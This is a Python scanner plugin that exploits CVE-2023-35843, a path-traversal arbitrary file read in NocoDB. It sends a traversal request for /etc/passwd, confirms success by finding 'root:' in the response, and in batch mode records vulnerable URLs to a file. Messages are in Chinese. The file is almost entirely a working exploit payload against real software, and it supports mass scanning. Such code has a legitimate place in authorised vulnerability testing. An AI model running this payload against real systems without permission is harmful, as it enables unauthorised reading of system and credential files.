#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class Cve_2023_35843:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
        try:
            req = requests.get(url2,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:" in req.text:
                OutPrintInfoSuc("NocoDB", f"存在NocoDB任意文件读取漏洞 {url2}")

                if self.batch:
                    with open("./result/nocodb_2023_35843.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NocoDB", f"不存在NocoDB 任意文件读取漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NocoDB", "不存在NocoDB 任意文件读取漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("NocoDB", "开始检测NocoDB 任意文件读取漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("NocoDB", "NocoDB 任意文件读取漏洞检测结束")
